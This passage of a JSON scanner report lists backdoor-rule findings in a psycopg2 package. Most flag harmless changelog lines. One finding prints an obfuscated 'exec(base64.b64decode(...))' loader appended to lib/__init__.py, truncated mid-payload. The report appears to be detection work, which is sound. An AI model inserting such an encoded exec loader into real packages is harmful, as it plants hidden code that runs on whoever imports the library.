                  "snippet": {
                    "text": "- Maybe fixed building on MSYS2 (as reported in :ticket:`#658`).\n- Allow string subclasses in connection and other places (:ticket:`#679`).\n- Don't raise an exception closing an unused named cursor (:ticket:`#716`).\n- Wheel package bundled with PostgreSQL 10.4 libpq and OpenSSL 1.0.2o.\n\n\nWhat's new in psycopg 2.7.4\n",
                    "rendered": {
                      "text": "- Maybe fixed building on MSYS2 (as reported in :ticket:`#658`).\n- Allow string subclasses in connection and other places (:ticket:`#679`).\n- Don't raise an exception closing an unused named cursor (:ticket:`#716`).\n- Wheel package bundled with PostgreSQL 10.4 libpq and OpenSSL 1.0.2o.\n\n\nWhat's new in psycopg 2.7.4\n",
                      "markdown": "`- Maybe fixed building on MSYS2 (as reported in :ticket:`#658`).\n- Allow string subclasses in connection and other places (:ticket:`#679`).\n- Don't raise an exception closing an unused named cursor (:ticket:`#716`).\n- Wheel package bundled with PostgreSQL 10.4 libpq and OpenSSL 1.0.2o.\n\n\nWhat's new in psycopg 2.7.4\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 289,
                  "startColumn": 54,
                  "endLine": 289,
                  "endColumn": 63,
                  "snippet": {
                    "text": "- `~psycopg2.extras.execute_values()` accepts `~psycopg2.sql.Composable`\n  objects (:ticket:`#794`).\n- `~psycopg2.errorcodes` map updated to PostgreSQL 11.\n- Wheel package bundled with PostgreSQL 10.5 libpq and OpenSSL 1.0.2p.\n\n\nWhat's new in psycopg 2.7.5\n",
                    "rendered": {
                      "text": "- `~psycopg2.extras.execute_values()` accepts `~psycopg2.sql.Composable`\n  objects (:ticket:`#794`).\n- `~psycopg2.errorcodes` map updated to PostgreSQL 11.\n- Wheel package bundled with PostgreSQL 10.5 libpq and OpenSSL 1.0.2p.\n\n\nWhat's new in psycopg 2.7.5\n",
                      "markdown": "`- `~psycopg2.extras.execute_values()` accepts `~psycopg2.sql.Composable`\n  objects (:ticket:`#794`).\n- `~psycopg2.errorcodes` map updated to PostgreSQL 11.\n- Wheel package bundled with PostgreSQL 10.5 libpq and OpenSSL 1.0.2p.\n\n\nWhat's new in psycopg 2.7.5\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 265,
                  "startColumn": 28,
                  "endLine": 265,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n- Cleanup of the cursor results assignment code, which might have solved\n  double free and inconsistencies in concurrent usage (:tickets:`#346, #384`).\n- Wheel package bundled with OpenSSL 1.0.2q.\n\n\nWhat's new in psycopg 2.7.6.1\n",
                    "rendered": {
                      "text": "\n- Cleanup of the cursor results assignment code, which might have solved\n  double free and inconsistencies in concurrent usage (:tickets:`#346, #384`).\n- Wheel package bundled with OpenSSL 1.0.2q.\n\n\nWhat's new in psycopg 2.7.6.1\n",
                      "markdown": "`\n- Cleanup of the cursor results assignment code, which might have solved\n  double free and inconsistencies in concurrent usage (:tickets:`#346, #384`).\n- Wheel package bundled with OpenSSL 1.0.2q.\n\n\nWhat's new in psycopg 2.7.6.1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 28,
                  "endLine": 257,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  source files are now compatible with Python 2 & 3 as is.\n- The `!psycopg2.test` package is no longer installed by ``python setup.py\n  install``.\n- Wheel package bundled with OpenSSL 1.0.2r and PostgreSQL 11.2 libpq.\n\n\nWhat's new in psycopg 2.7.7\n",
                    "rendered": {
                      "text": "  source files are now compatible with Python 2 & 3 as is.\n- The `!psycopg2.test` package is no longer installed by ``python setup.py\n  install``.\n- Wheel package bundled with OpenSSL 1.0.2r and PostgreSQL 11.2 libpq.\n\n\nWhat's new in psycopg 2.7.7\n",
                      "markdown": "`  source files are now compatible with Python 2 & 3 as is.\n- The `!psycopg2.test` package is no longer installed by ``python setup.py\n  install``.\n- Wheel package bundled with OpenSSL 1.0.2r and PostgreSQL 11.2 libpq.\n\n\nWhat's new in psycopg 2.7.7\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 56,
                  "endLine": 250,
                  "endColumn": 62,
                  "snippet": {
                    "text": "- Binary packages no longer installed by default. The 'psycopg2-binary'\n  package must be used explicitly.\n- Dropped `!PSYCOPG_DISPLAY_SIZE` build parameter.\n- Dropped support for mxDateTime as the default date and time adapter.\n  mxDatetime support continues to be available as an alternative to Python's\n  builtin datetime.\n- No longer use 2to3 during installation for Python 2 & 3 compatibility. All\n",
                    "rendered": {
                      "text": "- Binary packages no longer installed by default. The 'psycopg2-binary'\n  package must be used explicitly.\n- Dropped `!PSYCOPG_DISPLAY_SIZE` build parameter.\n- Dropped support for mxDateTime as the default date and time adapter.\n  mxDatetime support continues to be available as an alternative to Python's\n  builtin datetime.\n- No longer use 2to3 during installation for Python 2 & 3 compatibility. All\n",
                      "markdown": "`- Binary packages no longer installed by default. The 'psycopg2-binary'\n  package must be used explicitly.\n- Dropped `!PSYCOPG_DISPLAY_SIZE` build parameter.\n- Dropped support for mxDateTime as the default date and time adapter.\n  mxDatetime support continues to be available as an alternative to Python's\n  builtin datetime.\n- No longer use 2to3 during installation for Python 2 & 3 compatibility. All\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 28,
                  "endLine": 186,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n- Fixed `~psycopg2.extras.RealDictCursor` when there are repeated columns\n  (:ticket:`#884`).\n- Binary packages built with openssl 1.1.1b. Should fix concurrency problems\n  (:tickets:`#543, #836`).\n\n\n",
                    "rendered": {
                      "text": "\n- Fixed `~psycopg2.extras.RealDictCursor` when there are repeated columns\n  (:ticket:`#884`).\n- Binary packages built with openssl 1.1.1b. Should fix concurrency problems\n  (:tickets:`#543, #836`).\n\n\n",
                      "markdown": "`\n- Fixed `~psycopg2.extras.RealDictCursor` when there are repeated columns\n  (:ticket:`#884`).\n- Binary packages built with openssl 1.1.1b. Should fix concurrency problems\n  (:tickets:`#543, #836`).\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 28,
                  "endLine": 168,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  and `~psycopg2.extensions.Column.type_code` (:ticket:`#961`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 12.\n- Wheel package bundled with OpenSSL 1.1.1d and PostgreSQL at least 11.4.\n\n\nWhat's new in psycopg 2.8.3\n",
                    "rendered": {
                      "text": "  and `~psycopg2.extensions.Column.type_code` (:ticket:`#961`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 12.\n- Wheel package bundled with OpenSSL 1.1.1d and PostgreSQL at least 11.4.\n\n\nWhat's new in psycopg 2.8.3\n",
                      "markdown": "`  and `~psycopg2.extensions.Column.type_code` (:ticket:`#961`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 12.\n- Wheel package bundled with OpenSSL 1.1.1d and PostgreSQL at least 11.4.\n\n\nWhat's new in psycopg 2.8.3\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 28,
                  "endLine": 139,
                  "endColumn": 37,
                  "snippet": {
                    "text": "- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 13.\n- Added wheel packages for ARM architecture (:ticket:`#1125`).\n- Wheel package bundled with OpenSSL 1.1.1g.\n\n\nWhat's new in psycopg 2.8.5\n",
                    "rendered": {
                      "text": "- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 13.\n- Added wheel packages for ARM architecture (:ticket:`#1125`).\n- Wheel package bundled with OpenSSL 1.1.1g.\n\n\nWhat's new in psycopg 2.8.5\n",
                      "markdown": "`- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 13.\n- Added wheel packages for ARM architecture (:ticket:`#1125`).\n- Wheel package bundled with OpenSSL 1.1.1g.\n\n\nWhat's new in psycopg 2.8.5\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 28,
                  "endLine": 115,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  platforms.\n- Provide :pep:`600` wheels packages (manylinux_2_24 tag) for aarch64 and\n  ppc64le platforms.\n- Wheel package bundled with OpenSSL 1.1.1k and PostgreSQL 13.3 libpq.\n- Build system for Linux/MacOS binary packages moved to GitHub Actions.\n\n\n",
                    "rendered": {
                      "text": "  platforms.\n- Provide :pep:`600` wheels packages (manylinux_2_24 tag) for aarch64 and\n  ppc64le platforms.\n- Wheel package bundled with OpenSSL 1.1.1k and PostgreSQL 13.3 libpq.\n- Build system for Linux/MacOS binary packages moved to GitHub Actions.\n\n\n",
                      "markdown": "`  platforms.\n- Provide :pep:`600` wheels packages (manylinux_2_24 tag) for aarch64 and\n  ppc64le platforms.\n- Wheel package bundled with OpenSSL 1.1.1k and PostgreSQL 13.3 libpq.\n- Build system for Linux/MacOS binary packages moved to GitHub Actions.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 28,
                  "endLine": 78,
                  "endColumn": 37,
                  "snippet": {
                    "text": "- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 14.\n- Add preliminary support for Python 3.11 (:tickets:`#1376, #1386`).\n- Wheel package bundled with OpenSSL 1.1.1l and PostgreSQL 14.1 libpq\n  (:ticket:`#1388`).\n\n\n",
                    "rendered": {
                      "text": "- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 14.\n- Add preliminary support for Python 3.11 (:tickets:`#1376, #1386`).\n- Wheel package bundled with OpenSSL 1.1.1l and PostgreSQL 14.1 libpq\n  (:ticket:`#1388`).\n\n\n",
                      "markdown": "`- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 14.\n- Add preliminary support for Python 3.11 (:tickets:`#1376, #1386`).\n- Wheel package bundled with OpenSSL 1.1.1l and PostgreSQL 14.1 libpq\n  (:ticket:`#1388`).\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 28,
                  "endLine": 61,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  binary packages (:ticket:`#1365`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 15.\n- Wheel package bundled with OpenSSL 1.1.1q and PostgreSQL 14.4 libpq.\n\n\nWhat's new in psycopg 2.9.3\n",
                    "rendered": {
                      "text": "  binary packages (:ticket:`#1365`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 15.\n- Wheel package bundled with OpenSSL 1.1.1q and PostgreSQL 14.4 libpq.\n\n\nWhat's new in psycopg 2.9.3\n",
                      "markdown": "`  binary packages (:ticket:`#1365`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 15.\n- Wheel package bundled with OpenSSL 1.1.1q and PostgreSQL 14.4 libpq.\n\n\nWhat's new in psycopg 2.9.3\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 1,
                  "endLine": 57,
                  "endColumn": 7,
                  "snippet": {
                    "text": "  `~psycopg2.extras.register_range()` with customized :sql:`search_path`\n  (:ticket:`#1487`).\n- Handle correctly composite types with names or in schemas requiring escape.\n- Find ``pg_service.conf`` file in the ``/etc/postgresql-common`` directory in\n  binary packages (:ticket:`#1365`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 15.\n",
                    "rendered": {
                      "text": "  `~psycopg2.extras.register_range()` with customized :sql:`search_path`\n  (:ticket:`#1487`).\n- Handle correctly composite types with names or in schemas requiring escape.\n- Find ``pg_service.conf`` file in the ``/etc/postgresql-common`` directory in\n  binary packages (:ticket:`#1365`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 15.\n",
                      "markdown": "`  `~psycopg2.extras.register_range()` with customized :sql:`search_path`\n  (:ticket:`#1487`).\n- Handle correctly composite types with names or in schemas requiring escape.\n- Find ``pg_service.conf`` file in the ``/etc/postgresql-common`` directory in\n  binary packages (:ticket:`#1365`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 15.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 28,
                  "endLine": 47,
                  "endColumn": 37,
                  "snippet": {
                    "text": "- Add support for Python 3.11.\n- Add support for rowcount in MERGE statements in binary packages\n  (:ticket:`#1497`).\n- Wheel package bundled with OpenSSL 1.1.1r and PostgreSQL 15 libpq.\n\n\nWhat's new in psycopg 2.9.4\n",
                    "rendered": {
                      "text": "- Add support for Python 3.11.\n- Add support for rowcount in MERGE statements in binary packages\n  (:ticket:`#1497`).\n- Wheel package bundled with OpenSSL 1.1.1r and PostgreSQL 15 libpq.\n\n\nWhat's new in psycopg 2.9.4\n",
                      "markdown": "`- Add support for Python 3.11.\n- Add support for rowcount in MERGE statements in binary packages\n  (:ticket:`#1497`).\n- Wheel package bundled with OpenSSL 1.1.1r and PostgreSQL 15 libpq.\n\n\nWhat's new in psycopg 2.9.4\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 28,
                  "endLine": 38,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n- Package manylinux 2014 for aarch64 and ppc64le platforms, in order to\n  include libpq 15 in the binary package (:ticket:`#1396`).\n- Wheel package bundled with OpenSSL 1.1.1t.\n\n\nWhat's new in psycopg 2.9.5\n",
                    "rendered": {
                      "text": "\n- Package manylinux 2014 for aarch64 and ppc64le platforms, in order to\n  include libpq 15 in the binary package (:ticket:`#1396`).\n- Wheel package bundled with OpenSSL 1.1.1t.\n\n\nWhat's new in psycopg 2.9.5\n",
                      "markdown": "`\n- Package manylinux 2014 for aarch64 and ppc64le platforms, in order to\n  include libpq 15 in the binary package (:ticket:`#1396`).\n- Wheel package bundled with OpenSSL 1.1.1t.\n\n\nWhat's new in psycopg 2.9.5\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 28,
                  "endLine": 30,
                  "endColumn": 37,
                  "snippet": {
                    "text": "- Fix propagation of exceptions raised during module initialization\n  (:ticket:`#1598`).\n- Fix building when pg_config returns an empty string (:ticket:`#1599`).\n- Wheel package bundled with OpenSSL 1.1.1v.\n\n\nWhat's new in psycopg 2.9.6\n",
                    "rendered": {
                      "text": "- Fix propagation of exceptions raised during module initialization\n  (:ticket:`#1598`).\n- Fix building when pg_config returns an empty string (:ticket:`#1599`).\n- Wheel package bundled with OpenSSL 1.1.1v.\n\n\nWhat's new in psycopg 2.9.6\n",
                      "markdown": "`- Fix propagation of exceptions raised during module initialization\n  (:ticket:`#1598`).\n- Fix building when pg_config returns an empty string (:ticket:`#1599`).\n- Wheel package bundled with OpenSSL 1.1.1v.\n\n\nWhat's new in psycopg 2.9.6\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 358,
                  "startColumn": 20,
                  "endLine": 358,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  (:tickets:`#263, #311, #443`). Was fixed in 2.6.2 but not included in\n  2.7 by mistake.\n- Fixed Python exceptions propagation in green callback (:ticket:`#410`).\n- Don't display the password in `connection.dsn` when the connection\n  string is specified as an URI (:ticket:`#528`).\n- Return objects with timezone parsing \"infinity\" :sql:`timestamptz`\n  (:ticket:`#536`).\n",
                    "rendered": {
                      "text": "  (:tickets:`#263, #311, #443`). Was fixed in 2.6.2 but not included in\n  2.7 by mistake.\n- Fixed Python exceptions propagation in green callback (:ticket:`#410`).\n- Don't display the password in `connection.dsn` when the connection\n  string is specified as an URI (:ticket:`#528`).\n- Return objects with timezone parsing \"infinity\" :sql:`timestamptz`\n  (:ticket:`#536`).\n",
                      "markdown": "`  (:tickets:`#263, #311, #443`). Was fixed in 2.6.2 but not included in\n  2.7 by mistake.\n- Fixed Python exceptions propagation in green callback (:ticket:`#410`).\n- Don't display the password in `connection.dsn` when the connection\n  string is specified as an URI (:ticket:`#528`).\n- Return objects with timezone parsing \"infinity\" :sql:`timestamptz`\n  (:ticket:`#536`).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 38,
                  "endLine": 205,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\n- Added `~psycopg2.errors` module. Every PostgreSQL error is converted into\n  a specific exception class (:ticket:`#682`).\n- Added `~psycopg2.extensions.encrypt_password()` function (:ticket:`#576`).\n- Added `~psycopg2.extensions.BYTES` adapter to manage databases with mixed\n  encodings on Python 3 (:ticket:`#835`).\n- Added `~psycopg2.extensions.Column.table_oid` and\n",
                    "rendered": {
                      "text": "\n- Added `~psycopg2.errors` module. Every PostgreSQL error is converted into\n  a specific exception class (:ticket:`#682`).\n- Added `~psycopg2.extensions.encrypt_password()` function (:ticket:`#576`).\n- Added `~psycopg2.extensions.BYTES` adapter to manage databases with mixed\n  encodings on Python 3 (:ticket:`#835`).\n- Added `~psycopg2.extensions.Column.table_oid` and\n",
                      "markdown": "`\n- Added `~psycopg2.errors` module. Every PostgreSQL error is converted into\n  a specific exception class (:ticket:`#682`).\n- Added `~psycopg2.extensions.encrypt_password()` function (:ticket:`#576`).\n- Added `~psycopg2.extensions.BYTES` adapter to manage databases with mixed\n  encodings on Python 3 (:ticket:`#835`).\n- Added `~psycopg2.extensions.Column.table_oid` and\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 159,
                  "startColumn": 54,
                  "endLine": 159,
                  "endColumn": 62,
                  "snippet": {
                    "text": "^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Fixed building with Python 3.8 (:ticket:`#854`).\n- Don't swallow keyboard interrupts on connect when a password is specified\n  in the connection string (:ticket:`#898`).\n- Don't advance replication cursor when the message wasn't confirmed\n  (:ticket:`#940`).\n",
                    "rendered": {
                      "text": "^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Fixed building with Python 3.8 (:ticket:`#854`).\n- Don't swallow keyboard interrupts on connect when a password is specified\n  in the connection string (:ticket:`#898`).\n- Don't advance replication cursor when the message wasn't confirmed\n  (:ticket:`#940`).\n",
                      "markdown": "`^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Fixed building with Python 3.8 (:ticket:`#854`).\n- Don't swallow keyboard interrupts on connect when a password is specified\n  in the connection string (:ticket:`#898`).\n- Don't advance replication cursor when the message wasn't confirmed\n  (:ticket:`#940`).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 7,
                  "endLine": 79,
                  "endColumn": 13,
                  "snippet": {
                    "text": " here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNl",
                    "rendered": {
                      "text": " here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNl",
                      "markdown": "` here instead of in the C layer.\n# This way a new class is registered for each sub-interpreter.\n# See ticket #52\nfrom decimal import Decimal                         # noqa\nfrom psycopg2._psycopg import Decimal as Adapter    # noqa\n_ext.register_adapter(Decimal, Adapter)\ndel Decimal, Adapter\n\nimport base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNl`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/__init__.py"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 6,
                  "endLine": 79,
                  "endColumn": 14,
                  "snippet": {
